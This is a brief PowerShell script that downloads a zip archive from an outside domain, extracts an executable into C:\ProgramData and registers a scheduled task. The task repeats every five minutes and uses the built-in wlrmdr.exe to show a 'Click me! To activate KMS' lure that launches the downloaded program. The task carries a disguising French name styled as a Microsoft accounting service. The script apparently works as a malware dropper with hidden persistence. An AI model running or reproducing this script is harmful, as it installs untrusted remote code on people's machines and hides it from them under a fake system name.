# iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))

Invoke-WebRequest -Uri "https://ouest-vpn.fr/WindowsConfigManager.zip" -OutFile "C:\ProgramData\config.zip"
Expand-Archive -Path "C:\ProgramData\config.zip" -DestinationPath "C:\ProgramData\WindowsConfigManager"
$action=New-ScheduledTaskAction -Execute "wlrmdr.exe" -Argument '-s 3600 -f 0 -t Click me! -m To activate KMS -a 10 -u "C:\ProgramData\WindowsConfigManager\WindowsConfigManager\windows-compat.exe"'
$trigger=New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5) 
Register-ScheduledTask -TaskName "Systeme de comptabilité Microsoft" -Description "Assure la liste des services actifs" -Trigger $trigger -Action $action 
